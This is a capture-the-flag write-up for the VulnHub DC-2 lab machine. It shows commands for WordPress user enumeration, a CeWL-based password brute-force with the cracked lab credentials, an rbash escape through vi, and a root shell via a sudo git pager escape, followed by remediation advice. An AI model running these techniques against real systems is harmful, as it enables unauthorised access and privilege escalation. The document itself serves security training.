# DC-2 Write-up

> **Platform:** VulnHub  [DC-2](https://www.vulnhub.com/entry/dc-2,311/) **Machine:** DC-2 **Difficulty:** Beginner **Operating System:** Debian Linux **Author:** Ctum

---
## Overview

DC-2 is the second machine in the DC series from VulnHub. It builds on the same "follow the flags" structure as DC-1, but shifts focus to WordPress enumeration, custom wordlist generation with CeWL, a restricted shell breakout, and privilege escalation through a `sudo` misconfiguration on `git`. It's a good box for practicing lateral movement between low-privileged users before finally reaching root.

---
## Attack Path
1. Enumerated open services with Nmap.
2. Identified a WordPress site requiring a hosts file entry to resolve.
3. Enumerated WordPress users with WPScan.
4. Generated a custom, site-specific wordlist using CeWL.
5. Brute-forced WordPress credentials for two users.
6. Found SSH exposed on a non-standard port and reused the cracked credentials.
7. Broke out of a restricted (`rbash`) shell as `tom`.
8. Pivoted to the `jerry` account via `su`.
9. Abused a `sudo` NOPASSWD misconfiguration on `git` to escalate to root.
10. Retrieved the final flag.

---
## Initial Enumeration

Started with a full TCP port scan to avoid missing anything running on a non-standard port.
```bash
nmap -p- -sC -sV -T5 192.168.56.103 --open
```

The scan revealed two open ports:

|Port|Service|
|---|---|
|80|HTTP (Apache, Debian)|
|7744|SSH (OpenSSH 6.7)|

The non-default SSH port (7744) was worth remembering  it wasn't going to be reachable with a plain `ssh user@host` later on.

---
## Web Enumeration
Visiting `http://192.168.56.103` directly didn't resolve properly, so I checked what was going on with `wget`.

```bash
wget 192.168.56.103
```

The response indicated the site had moved permanently, and DNS resolution for `dc-2` was failing  the site was expecting to be reached by hostname, not IP. I added a manual hosts entry to fix this:

```bash
nano /etc/hosts
```

text

```text
192.168.56.103 dc-2
```

A follow-up `wget` returned a clean `200 OK`, and the site loaded correctly in the browser afterward. It turned out to be a WordPress installation.

---

## Flag 1

The homepage displayed the first flag directly:

```text
Flag 1:
Your usual wordlists probably won't work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can't win them all.

Log in as one to see the next flag.

If you can't find it, log in as another.
```

This was a fairly direct pointer toward **CeWL**, a tool that spiders a website and builds a custom wordlist from the words it finds on the page  useful when a site uses non-dictionary passwords tied to its own content.

---
## WordPress User Enumeration
Since this was a WordPress site, I used WPScan to enumerate users, themes, and plugins.

```bash
wpscan --url http://dc-2 -e vt,vp,u
```

- `--url` — target URL
- `-e` — enumerate
- `vt` — vulnerable themes
- `vp` — vulnerable plugins
- `u` — users

This returned three usernames: **tom**, **jerry**, and **admin**.

---
## Building a Custom Wordlist
Following the hint from Flag 1, I ran CeWL against the site to generate a wordlist based on its actual content, rather than relying on a generic list like rockyou.txt.

```bash
cewl http://dc-2 > /usr/share/wordlists/cewlpasswords.txt
```

With usernames and a targeted wordlist in hand, I ran a credential attack against the WordPress login using WPScan:

```bash
wpscan --url http://dc-2 --passwords /usr/share/wordlists/cewlpasswords.txt --usernames tom,jerry,admin
```

Two accounts cracked successfully:

```text
Username: jerry | Password: adipiscing
Username: tom   | Password: parturient
```

---
## Flag 2

Logging into `/wp-login.php`, the `tom` account didn't turn up anything of interest, but logging in revealed **Flag 2**:

```text
Flag 2:
If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
```

Since SSH was already known to be open on port 7744, and I now had valid credentials, this pointed toward using SSH as the actual entry point rather than trying to pivot to RCE inside WordPress itself.

---
## Gaining Shell Access

```bash
ssh -p 7744 tom@192.168.56.103
```

The `tom` credentials worked, dropping me into a shell. Listing the home directory immediately showed **flag3.txt**  but `cat` wasn't usable, because `tom`'s shell was a restricted shell (`rbash`) that blocked most commands. The only binaries available were `less`, `ls`, `scp`, and `vi`.

---
## Breaking Out of the Restricted Shell

`vi` was the way out. Since Vim can execute shell commands, I used it to escape `rbash` entirely:

```text
vi
:set shell=/bin/bash
:shell
```

This dropped me into a real Bash shell instead of the restricted one. To make standard commands usable again, I rebuilt the `PATH`:

```bash
export PATH=$PATH:/bin:/usr/bin
```

With that, `cat` and other previously blocked commands worked normally, and I could read **Flag 3**:

```text
Flag3:
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```

A direct hint to switch to the `jerry` account.

---
## Pivoting to Jerry

Checking `sudo -l` as `tom` showed he wasn't permitted to run `sudo` at all, confirming the hint  `jerry` was the next step, not further privilege checks on `tom`.

Before switching, I checked `/home` and found **Flag 4** sitting in Jerry's directory, still readable as `tom`:

```bash
cat /home/jerry/flag4.txt
```

```text
Good to see that you've made it this far - but you're not home yet.

You still need to get the final flag (the only flag that really counts!!!).

No hints here - you're on your own now. :-)

Go on - git outta here!!!!
```

The closing line ("git outta here") was a not-so-subtle nod toward `git` being the escalation vector.

---
## Privilege Escalation

Switched to the `jerry` account using the cracked WordPress password (reused successfully here) :

```bash
su jerry
```

Checked what `jerry` was permitted to run with elevated privileges:

```bash
sudo -l
```

```text
Matching Defaults entries for jerry on DC-2:
   env_reset, mail_badpass,
   secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User jerry may run the following commands on DC-2:
   (root) NOPASSWD: /usr/bin/git
```

`jerry` could run `git` as root with no password required. A quick check on [GTFOBins](https://gtfobins.github.io/gtfobins/git/#sudo) confirmed the abuse path via Git's built-in pager/help escape:

```bash
sudo git branch --help config
```

From inside the resulting pager, running:

```text
!/bin/sh
```

dropped into a root shell immediately.

---
## Final Flag

```bash
cat /root/final-flag.txt
```

```text
 __    __     _ _       _                    _
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/


Congratulations!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

Machine complete.

---
## Flags Summary

|Flag|Location|How It Was Found|
|---|---|---|
|1|WordPress homepage|Displayed directly, hinting at CeWL|
|2|WordPress login (as `tom`)|Revealed after logging in with cracked credentials|
|3|`/home/tom/flag3.txt`|Read after breaking out of the `rbash` restricted shell|
|4|`/home/jerry/flag4.txt`|Readable from `tom`'s session, hinting at `git`|
|Final|`/root/final-flag.txt`|Retrieved after `sudo git` privilege escalation|

---
## Remediation

- **Restrict WordPress login attempts** and enforce strong, non-dictionary passwords — CeWL-generated wordlists work precisely because site-specific content leaks into weak passwords.
- **Disable or limit WordPress user enumeration** (`?author=1` style probing and REST API user listings) to make credential attacks harder to target.
- **Don't reuse the same password across services** — the `jerry` WordPress password also worked for the local system account via `su`, turning one weak credential into a full compromise path.
- **Properly configure restricted shells.** `rbash` alone isn't sufficient hardening if PATH manipulation or shell-escaping binaries like `vi`, `less`, or `scp` remain available.
- **Audit `sudoers` entries carefully.** `NOPASSWD` access to `git` (or any binary with a known shell-escape) is equivalent to unrestricted root access. Reference [GTFOBins](https://gtfobins.github.io/) before granting `sudo` rights to any binary.
- **Avoid running unnecessary services on predictable alternate ports** — port 7744 for SSH didn't add real security, just minor obscurity.

---
## Lessons Learned

- Not all wordlists are created equal — content-aware wordlists (CeWL) can succeed where generic ones fail.
- A CMS-focused entry point (WordPress) isn't always the actual way in; sometimes it's just the credential source for a different service (SSH).
- Restricted shells (`rbash`) are frequently escapable through text editors, pagers, or any binary that can spawn a subshell.
- `sudo -l` should be one of the first things checked on any new user context during privilege escalation.
- GTFOBins is just as useful for `sudo` misconfigurations as it is for SUID binaries.

---

## Tools Used

- Nmap
- WPScan
- CeWL
- SSH
- Vim (shell breakout)
- GTFOBins

---
## Technologies Encountered

- WordPress
- Apache
- OpenSSH (non-standard port)
- Debian Linux

---

## Skills Practiced

- Network Enumeration
- WordPress Enumeration
- Custom Wordlist Generation
- Credential Attacks
- Restricted Shell Escape
- Lateral Movement (user pivoting)
- Sudo Misconfiguration Exploitation